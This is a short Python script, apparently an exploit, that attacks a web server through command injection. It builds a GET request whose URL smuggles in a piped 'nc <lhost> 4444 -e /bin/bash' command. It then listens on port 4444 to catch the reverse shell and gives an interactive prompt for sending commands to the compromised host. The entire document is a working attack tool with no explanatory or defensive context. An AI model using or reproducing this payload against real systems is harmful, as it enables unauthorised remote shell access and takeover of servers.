from socket import *
import sys

con = socket(AF_INET,SOCK_STREAM)
han = socket(AF_INET,SOCK_STREAM)
rhost, url, lhost = sys.argv[1], sys.argv[2], sys.argv[3]

con.connect((rhost,80))
payload = "GET "+ url +"|%20nc%20"+ lhost +"%204444%20-e%20/bin/bash HTTP/1.1\nHost: "+ rhost +"\n\n"
han.bind(("",4444))
han.listen(1)
con.send(payload)

cl = han.accept()
while True:
    send = raw_input("==>")
    cl.send(send + "\n")
    data = cl.recv(1024)
    print(data)
